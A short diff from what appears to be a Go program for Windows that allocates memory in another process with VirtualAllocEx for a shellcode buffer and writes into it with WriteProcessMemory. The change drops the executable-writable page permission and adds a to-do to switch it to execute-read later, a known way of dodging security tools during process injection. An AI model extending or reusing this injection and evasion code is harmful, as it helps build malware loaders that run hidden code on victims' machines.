@@ -81,12 +81,14 @@ func main() {
 		uintptr(0),
 		uintptr(len(sc)),
 		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
-		uintptr(windows.PAGE_EXECUTE_READWRITE))
+		uintptr(windows.PAGE_READWRITE))
 	if rAddr == 0 {
 		fmt.Printf("VirtualAllocEx failed: %v\n", err)
 		os.Exit(1)
 	}
 
+	// TO-DO change permission using virtaulProtect
+	// PAGE_READWRITE -> PAGE_EXCUTE_READ
 	/* write to buffer using NewProc */
 	var bytesWritten uintptr
 	rWrite, _, errW := pWriteProcessMemory.Call(
